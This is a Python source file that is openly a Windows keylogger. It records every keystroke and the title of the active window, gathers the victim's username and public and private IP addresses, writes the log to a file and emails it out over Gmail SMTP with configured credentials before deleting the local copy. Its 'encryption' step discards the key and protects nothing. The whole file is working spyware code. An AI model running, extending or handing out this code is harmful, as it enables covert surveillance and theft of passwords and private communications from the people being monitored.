#//python keylogging program with encryption and sending logs

from pynput.keyboard import Key,Listener
import win32gui
import os
import time
import requests
import socket
import random
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from cryptography.fernet import Fernet
import threading
import config


datetime = time.ctime(time.time())
user = os.path.expanduser('~').split('\\')[2]
publicIP = requests.get('https://api.ipify.org/').text
privateIP = socket.gethostbyname(socket.gethostname())

msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
logged_data = []
logged_data.append(msg)

old_app = ''
delete_file = []
key_pressed = ''


def on_press(key):
	global old_app
	global key_pressed

	key_pressed = key

	new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
	#print(new_app, "\n")
	if new_app == 'Cortana':
		new_app = 'Windows Start Menu'
	else:
		pass
	
	
	if new_app != old_app and new_app != '':
		logged_data.append(f'[{datetime}] ~ {new_app}\n')
		old_app = new_app
	else:
		pass


	substitution = ['Key.enter', '\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
	'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
	'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '', '\\x0e', '[CTRL-N]', '\\x13', 
	'[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
	'[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]', 'Key.esc', '']

	#if key != Key.backspace:
	key = str(key).strip('\'')
	#key = str(key).replace("'", "")
	print("{0} pressed".format(key))
	if key in substitution:
		logged_data.append(substitution[substitution.index(key)+1])
	else:
		logged_data.append(key)




def write_file(count):
	file = "log.txt"
	delete_file.append(file)


	with open(file,'w') as fp:
		fp.write(''.join(logged_data))
	print('written all good')

def encrypt_message(message):
	enc_key = Fernet.generate_key()
	encoded_msg = message.encode()
	f = Fernet(enc_key)
	encrypted_message = f.encrypt(encoded_msg)

	return encrypted_message

def send_logs():
	global key_pressed
	count = 0

	fromAddr = config.fromAddr
	fromPswd = config.fromPswd
	toAddr = fromAddr

	if len(logged_data) > 1:
		try:
			write_file(count)
			print("encrypting message")

			e_msg = encrypt_message(''.join(logged_data))
			with open("log.txt", "a") as f:
				f.write("\nEncrypted as: \n")
				f.write(str(e_msg))
			f.close()

			subject = f'[{user}] ~ {count}'

			msg = MIMEMultipart()
			msg['From'] = fromAddr
			msg['To'] = toAddr
			msg['Subject'] = subject
			body = 'testing'
			msg.attach(MIMEText(body,'plain'))

			attachment = open(delete_file[0],'rb')
			#print('attachment')

			filename = delete_file[0]

			part = MIMEBase('application','octect-stream')
			part.set_payload((attachment).read())
			encoders.encode_base64(part)
			part.add_header('content-disposition','attachment;filename='+str(filename))
			msg.attach(part)

			text = msg.as_string()
			#print('test msg.as_string')

			s = smtplib.SMTP('smtp.gmail.com',587)
			s.ehlo()
			s.starttls()
			#print('starttls')
			s.ehlo()
			s.login(fromAddr,fromPswd)
			s.sendmail(fromAddr,toAddr,text)
			print('sent mail')
			attachment.close()
			s.close()

			os.remove(delete_file[0])
			del logged_data[1:]
			del delete_file[0:]
			print('delete data/files')


		except Exception as errorString:
			print('[!] send_logs // Error.. ~ %s' % (errorString))
			pass
				
def on_release(key):
	global key_pressed
	key_pressed = key

	if key_pressed == Key.esc:
		send_logs()
		return False




if __name__=='__main__':
	# T1 = threading.Thread(target=send_logs)
	# T1.start()
	# time.sleep(1)

	with Listener(on_press=on_press, on_release=on_release) as listener:
		listener.join()

